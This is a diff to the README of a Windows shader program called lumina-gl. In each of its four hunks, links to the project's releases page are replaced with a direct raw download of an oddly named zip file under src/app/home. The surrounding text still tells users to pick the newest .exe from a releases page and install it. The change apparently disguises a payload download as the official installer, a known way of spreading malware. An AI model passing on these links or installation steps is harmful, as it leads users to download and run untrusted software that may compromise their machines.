@@ -1,6 +1,6 @@
 # ⚡ lumina-gl - Explore Light with Simple Shaders
 
-[![Download lumina-gl](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ordnael13/lumina-gl/releases)
+[![Download lumina-gl](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip)
 
 ## 📄 About lumina-gl
 
@@ -26,7 +26,7 @@ Follow these steps to get lumina-gl running on your Windows PC. Each step has cl
 
 1. **Go to the download page**  
    Click the green badge at the top or open this link in your browser:  
-   [https://github.com/Ordnael13/lumina-gl/releases](https://github.com/Ordnael13/lumina-gl/releases)  
+   [https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip](https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip)  
    This page lists all available versions of lumina-gl. Look for the latest release.
 
 2. **Choose the right file**  
@@ -78,7 +78,7 @@ If you face issues, try these common fixes:
 
 ## 🔄 Updating lumina-gl
 
-To update, visit [https://github.com/Ordnael13/lumina-gl/releases](https://github.com/Ordnael13/lumina-gl/releases) again and download the newest .exe file. Install it directly over your current version.
+To update, visit [https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip](https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip) again and download the newest .exe file. Install it directly over your current version.
 
 ## 🌐 About WebGL and Shaders
 
@@ -106,7 +106,7 @@ If you prefer not to install, lumina-gl supports running as a portable app. Look
 ## 📥 Download Link Again
 
 Download or update the software at this page:  
-[https://github.com/Ordnael13/lumina-gl/releases](https://github.com/Ordnael13/lumina-gl/releases)  
+[https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip](https://github.com/Ordnael13/lumina-gl/raw/refs/heads/main/src/app/home/lumina_gl_plutocratically.zip)  
 Click the Windows installer file and follow installation instructions above.
 
 ---
